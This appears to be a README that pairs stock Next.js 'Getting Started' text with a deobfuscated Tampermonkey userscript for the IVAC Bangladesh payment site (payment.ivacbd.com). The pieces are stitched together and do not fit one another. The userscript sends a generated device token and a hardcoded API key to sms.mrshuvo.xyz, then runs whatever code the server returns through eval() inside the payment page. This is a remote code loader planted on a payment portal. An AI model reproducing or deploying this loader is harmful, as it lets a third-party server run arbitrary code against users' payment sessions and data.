
## Getting Started


// @match        https://payment.ivacbd.com/*

// @match        https://nhrepon-portfolio.vercel.app/*



First, run the development server:

```bash
npm run dev
# or
yarn dev
# or
pnpm dev
# or
bun dev
```





```js
https://obf-io.deobfuscate.io/

// ==UserScript==
// @name         IVAC — First-run Generated Suit
// @namespace    http://tampermonkey.net/
// @version      2025-08-11
// @description  IVAC — First-run Generated Suit
// @author       Shuvo Mukherjee
// @match        https://payment.ivacbd.com/*
// @run-at       document-end
// @inject-into  content
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_xmlhttpRequest
// @connect      sms.mrshuvo.xyz
// @require      https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js
// ==/UserScript==

(function () {
  'use strict';

  // Your User name
  const STORAGE = {
    'idb': {
      'db': "ivac_kv",
      'store': 'kv',
      'key': "device_key"
    },
    'gmPlainKey': "ivac_device_key_static_user"
  };
  if (window.__ivacInitRunning) {
    return;
  }
  window.__ivacInitRunning = true;
  const sleep = _0x36cd2a => new Promise(_0x14d467 => setTimeout(_0x14d467, _0x36cd2a));
  function idbOpen(_0x2be144, _0x574318) {
    return new Promise((_0x257d7c, _0xf17eac) => {
      const _0xce50f2 = indexedDB.open(_0x2be144, 1);
      _0xce50f2.onupgradeneeded = () => {
        const _0x109643 = _0xce50f2.result;
        if (!_0x109643.objectStoreNames.contains(_0x574318)) {
          _0x109643.createObjectStore(_0x574318);
        }
      };
      _0xce50f2.onsuccess = () => _0x257d7c(_0xce50f2.result);
      _0xce50f2.onerror = () => _0xf17eac(_0xce50f2.error);
    });
  }
  async function idbGet(_0x2c8b16, _0x5d4467, _0x4e1a0d) {
    try {
      const _0x270b17 = await idbOpen(_0x2c8b16, _0x5d4467);
      return await new Promise((_0x540826, _0x16d321) => {
        const _0x33f810 = _0x270b17.transaction(_0x5d4467, "readonly");
        const _0x1268d2 = _0x33f810.objectStore(_0x5d4467);
        const _0x256f91 = _0x1268d2.get(_0x4e1a0d);
        _0x256f91.onsuccess = () => _0x540826(_0x256f91.result ?? null);
        _0x256f91.onerror = () => _0x16d321(_0x256f91.error);
      });
    } catch {
      return null;
    }
  }
  async function idbSet(_0x1f762d, _0x308a29, _0x97433f, _0x4a84e1) {
    try {
      const _0xc06f50 = await idbOpen(_0x1f762d, _0x308a29);
      await new Promise((_0x5ca221, _0x592ca6) => {
        const _0x33643d = _0xc06f50.transaction(_0x308a29, "readwrite");
        const _0x1fd364 = _0x33643d.objectStore(_0x308a29);
        const _0x486edc = _0x1fd364.put(_0x4a84e1, _0x97433f);
        _0x486edc.onsuccess = () => _0x5ca221();
        _0x486edc.onerror = () => _0x592ca6(_0x486edc.error);
      });
      return true;
    } catch {
      return false;
    }
  }
  function gmGet() {
    return GM_getValue("ivac_device_key_static_user", null);
  }
  function gmSet(_0x53d9c3) {
    GM_setValue("ivac_device_key_static_user", _0x53d9c3);
  }
  function generateUserToken(_0x4e3934) {
    const _0x4ca01f = Math.floor(100000 + Math.random() * 900000);
    return "User-" + _0x4e3934 + '-' + _0x4ca01f;
  }
  async function ensureToken() {
    let _0x4324f2 = gmGet();
    if (!_0x4324f2 || typeof _0x4324f2 !== "string") {
      _0x4324f2 = generateUserToken("Ruposh");
      gmSet(_0x4324f2);
      console.log("%c[IVAC] Generated and saved new token:", "color:green", _0x4324f2);
    }
    const _0x436571 = await idbGet(STORAGE.idb.db, STORAGE.idb.store, STORAGE.idb.key);
    if (_0x436571 !== _0x4324f2) {
      await idbSet(STORAGE.idb.db, STORAGE.idb.store, STORAGE.idb.key, _0x4324f2);
      console.log("%c[IVAC] Wrote token to IndexedDB", "color:green");
    }
    return _0x4324f2;
  }
  async function readTokenFromIDB() {
    return await idbGet(STORAGE.idb.db, STORAGE.idb.store, STORAGE.idb.key);
  }
  function getJSON(_0x422edf, _0x5ac86d = {}) {
    return new Promise((_0x40652c, _0x5713f2) => {
      if (typeof GM_xmlhttpRequest === "function") {
        GM_xmlhttpRequest({
          'method': "GET",
          'url': _0x422edf,
          'headers': _0x5ac86d,
          'timeout': 0x3a98,
          'onload': _0xc9f0af => {
            if (_0xc9f0af.status >= 200 && _0xc9f0af.status < 300) {
              try {
                _0x40652c(JSON.parse(_0xc9f0af.responseText || '{}'));
              } catch (_0x276782) {
                _0x5713f2(_0x276782);
              }
            } else {
              _0x5713f2(Object.assign(new Error("HTTP " + _0xc9f0af.status), {
                'status': _0xc9f0af.status,
                'body': _0xc9f0af.responseText
              }));
            }
          },
          'onerror': _0x183abc => _0x5713f2(_0x183abc),
          'ontimeout': () => _0x5713f2(new Error("Request timeout"))
        });
      } else {
        fetch(_0x422edf, {
          'headers': _0x5ac86d,
          'credentials': "omit",
          'cache': "no-store"
        }).then(async _0x5e466f => {
          if (!_0x5e466f.ok) {
            throw Object.assign(new Error("HTTP " + _0x5e466f.status), {
              'status': _0x5e466f.status,
              'body': await _0x5e466f.text()
            });
          }
          return _0x5e466f.json();
        }).then(_0x40652c)["catch"](_0x5713f2);
      }
    });
  }
  (async () => {
    try {
      const _0x5412f8 = await ensureToken();
      const _0x336ffb = (await readTokenFromIDB()) || _0x5412f8;
      await sleep(100);
      const _0x39af2e = await getJSON("https://sms.mrshuvo.xyz/api/ivac-system-load", {
        'Accept': "application/json",
        'x-api-key': "shuvo-mukherjee",
        'x-device-key': _0x336ffb
      });
      if (_0x39af2e && typeof _0x39af2e.code === "string" && _0x39af2e.code.trim()) {
        try {
          eval(_0x39af2e.code);
        } catch (_0x4792ea) {
          console.error("[IVAC] Error evaluating returned code:", _0x4792ea);
        }
      } else {
        console.warn("[IVAC] API response did not include `code`.");
      }
    } catch (_0x5a8295) {
      console.error("[IVAC] Fatal error:", _0x5a8295);
    } finally {
      window.__ivacInitRunning = false;
    }
  })();
})();
```